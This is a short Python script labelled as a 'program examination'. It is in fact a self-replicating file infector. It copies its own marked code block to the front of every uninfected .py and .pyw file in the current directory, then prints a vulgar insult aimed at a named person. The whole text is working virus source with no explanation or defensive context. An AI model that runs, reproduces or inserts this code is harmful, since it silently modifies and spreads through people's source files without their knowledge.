###Start of the program examination###
import sys, glob
code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

examination_area = False
for line in lines:
    if line == '###Start of the program examination###\n':
        examination_area= True
    if examination_area:
        code.append(line)
    if line == '###End of the program examination###\n':
        break
python_scripts = glob.glob('*.py') + glob.glob('*.pyw')
for script in python_scripts:
    with open(script, 'r') as f:
        script_code=f.readlines()
    examinated = False
    for line in script_code:
        if line== '###Start of the program examination###\n':
            examinated = True
            break
    if not examinated:
        final_code = []
        final_code.extend(code)
        final_code.extend('\n')
        final_code.extend(script_code)

        with open(script, 'w') as f:
            f.writelines(final_code)

#Program results
print('Artur puto mono')
    
    
    
    
    ###End of the program examination###
